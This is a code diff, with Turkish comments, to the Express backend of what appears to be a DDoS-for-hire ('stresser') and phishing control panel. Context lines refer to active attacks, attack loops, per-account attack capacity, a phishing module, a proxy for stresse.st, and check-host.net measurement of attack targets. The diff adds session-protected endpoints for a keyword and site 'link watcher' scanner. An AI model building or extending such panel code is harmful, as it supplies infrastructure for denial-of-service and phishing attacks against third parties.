@@ -15,6 +15,7 @@ const path = require('path');
 const { sendTelegram, initTelegram, esc } = require('./telegram');
 const phish = require('./phish');
 const { initImpact, getImpactForUser } = require('./impact');
+const { initWatch, getState: watchState, addKeyword, removeKeyword, addSite, removeSite, triggerScan } = require('./watch');
 
 // stresse.st istekleri icin opsiyonel cikis proxy'si (HTTP veya SOCKS5;
 // or. http://user:pass@ip:port ya da socks5://127.0.0.1:1080).
@@ -2664,6 +2665,53 @@ app.post('/api/accounts/ensure', async (req, res) => {
 });
 
 /**
+ * Link Gozcusu (watch) uclari — ortak panel verisi; gecerli oturum yeterli.
+ */
+function watchAuth(req, res) {
+  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+  if (!sessionId || !sessions[sessionId]) {
+    res.status(401).json({ status: 'error', message: 'Session required' });
+    return false;
+  }
+  return true;
+}
+
+app.get('/api/watch/state', (req, res) => {
+  if (!watchAuth(req, res)) return;
+  res.json({ status: 'success', ...watchState() });
+});
+
+app.post('/api/watch/keywords', (req, res) => {
+  if (!watchAuth(req, res)) return;
+  const r = addKeyword(req.body?.keyword);
+  if (r.error) return res.status(400).json({ status: 'error', message: r.error });
+  res.json({ status: 'success', keywords: r.keywords });
+});
+
+app.delete('/api/watch/keywords', (req, res) => {
+  if (!watchAuth(req, res)) return;
+  res.json({ status: 'success', keywords: removeKeyword(req.body?.keyword).keywords });
+});
+
+app.post('/api/watch/sites', (req, res) => {
+  if (!watchAuth(req, res)) return;
+  const r = addSite(req.body?.site);
+  if (r.error) return res.status(400).json({ status: 'error', message: r.error });
+  res.json({ status: 'success', sites: r.sites });
+});
+
+app.delete('/api/watch/sites', (req, res) => {
+  if (!watchAuth(req, res)) return;
+  res.json({ status: 'success', sites: removeSite(req.body?.site).sites });
+});
+
+app.post('/api/watch/scan', (req, res) => {
+  if (!watchAuth(req, res)) return;
+  triggerScan();
+  res.json({ status: 'success', message: 'Tarama baslatildi' });
+});
+
+/**
  * GET /api/stresse/stats
  * Hesaba ozel sayaclar: aktif saldiri sayisi ve toplam kapasite.
  * Toplam = calisan loop'larin ayarlanmis concurrents toplami (tur arasi
@@ -3158,6 +3206,8 @@ app.get('/api/phish/stats', (req, res) => {
 loadState();
 // Etki Monitoru: aktif saldiri/loop hedeflerini check-host.net ile olcer.
 initImpact({ activeAttacks, activeLoops, sessions, getLoopOwner });
+// Link Gozcusu: izlenen sitelerde keyword->link ikililerini saatlik tarar.
+initWatch();
 // Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldirilari hesap
 // bazinda baz al.
 Object.values(activeAttacks).forEach((a) => {
